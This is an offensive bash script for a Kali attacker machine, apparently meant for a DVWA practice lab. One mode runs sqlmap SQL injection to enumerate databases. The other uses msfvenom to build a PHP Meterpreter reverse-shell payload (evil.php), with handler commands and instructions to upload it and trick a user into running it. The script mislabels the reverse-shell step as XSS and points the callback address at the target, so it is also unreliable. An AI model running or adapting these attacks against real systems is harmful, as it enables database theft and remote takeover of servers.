#!/bin/bash
# Web Attacks Script (SQL Injection & XSS)
# For Kali Linux VM (Attacker Machine)

if [ $# -ne 2 ]; then
    echo "Usage: $0 <target_ip> <attack_type>"
    echo "Attack types: sql, xss"
    exit 1
fi

TARGET_IP=$1
ATTACK_TYPE=$2

# DVWA Server URL
DVWA_URL="http://$TARGET_IP/DVWA"

echo "Starting Web attack of type $ATTACK_TYPE against $TARGET_IP"

case $ATTACK_TYPE in
    sql)
        echo "Launching SQL Injection attack against DVWA server..."
        
        # Example sqlmap command for SQL injection
        echo "Running sqlmap against target..."
        sqlmap -u "$DVWA_URL/vulnerabilities/sqli/?id=1&Submit=Submit" \
               --cookie="PHPSESSID=your_session_id; security=low" \
               --dbs
        
        echo "Note: In a real attack, you would need to:"
        echo "1. Login to DVWA first to get a valid session cookie"
        echo "2. Set the security level to low in DVWA settings"
        echo "3. Replace 'your_session_id' with an actual session ID"
        ;;
    xss)
        echo "Launching Cross-Site Scripting (XSS) attack preparation..."
        
        # Create a malicious PHP payload using msfvenom
        echo "Creating malicious PHP payload..."
        msfvenom -p php/meterpreter/reverse_tcp LHOST=$TARGET_IP LPORT=4444 -f raw > evil.php
        
        echo "In a real attack scenario, you would:"
        echo "1. Set up a listener using Metasploit:"
        echo "   use exploit/multi/handler"
        echo "   set payload php/meterpreter/reverse_tcp"
        echo "   set LHOST <your_ip>"
        echo "   set LPORT 4444"
        echo "   run"
        echo "2. Upload evil.php to the vulnerable server"
        echo "3. Trick the user into executing the payload"
        ;;
    *)
        echo "Unknown attack type: $ATTACK_TYPE"
        exit 1
        ;;
esac

echo "Web attack preparation completed!"
